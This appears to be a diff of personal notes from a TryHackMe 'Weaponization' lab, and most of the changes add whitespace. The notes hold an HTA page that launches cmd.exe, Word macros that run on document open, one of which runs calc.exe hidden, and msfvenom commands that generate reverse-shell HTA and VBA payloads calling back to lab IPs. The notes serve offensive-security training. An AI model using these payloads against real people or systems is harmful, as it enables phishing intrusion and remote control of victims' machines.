@@ -632,12 +632,19 @@ wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
 # HTML / HTA #
 
 <html>
+
 <body>
+
 <script>
+	
 	var c= 'cmd.exe'
+	
 	new ActiveXObject('WScript.Shell').Run(c);
+
 </script>
+
 </body>
+
 </html>
 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
@@ -647,21 +654,31 @@ use exploit/windows/misc/hta_server
 # Word Macro #
 
 Sub Document_Open()
-  THM
+  
+	THM
+
 End Sub
 
 Sub AutoOpen()
-  THM
+  
+	THM
+
 End Sub
 
 Sub THM()
-   MsgBox ("Welcome to Weaponization Room!")
+   
+	MsgBox ("Welcome to Weaponization Room!")
+
 End Sub
 
 Sub PoC()
+	
 	Dim payload As String
+	
 	payload = "calc.exe"
+	
 	CreateObject("Wscript.Shell").Run payload,0
+
 End Sub
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
